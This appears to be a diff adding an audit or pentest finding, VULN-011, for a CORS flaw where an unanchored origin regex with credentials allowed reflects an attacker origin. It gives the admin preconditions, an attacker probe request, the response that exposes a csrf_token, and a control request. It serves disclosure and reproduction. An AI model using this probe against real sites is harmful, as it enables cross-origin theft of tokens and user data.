@@ -1,0 +1,22 @@
+### VULN-011 — CORS unanchored regex + credentialed origin reflection (config-gated)
+
+### Precondition (admin, supported ACP settings):
+PUT /api/v3/admin/settings/access-control-allow-origin-regex   {"value":"example\\.com"}
+PUT /api/v3/admin/settings/access-control-allow-credentials    {"value":"true"}
+
+### Attacker probe (UNAUTHENTICATED; a real attack runs this from an attacker web page with credentials:'include'):
+GET /api/config HTTP/1.1
+Host: localhost:21372
+Origin: https://example.com.attacker.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) Chrome/124.0.0.0 Safari/537.36
+
+# -> HTTP/1.1 200 OK
+#    Access-Control-Allow-Origin: https://example.com.attacker.net    <-- attacker origin reflected (unanchored match)
+#    Access-Control-Allow-Credentials: true                           <-- credentialed cross-origin read allowed
+#    (body includes csrf_token when the request carries the victim's cookie)
+
+### Control (origin without the 'example.com' substring) — NOT reflected:
+GET /api/config HTTP/1.1
+Host: localhost:21372
+Origin: https://unrelated-evil.org
+# -> (no Access-Control-Allow-Origin header)
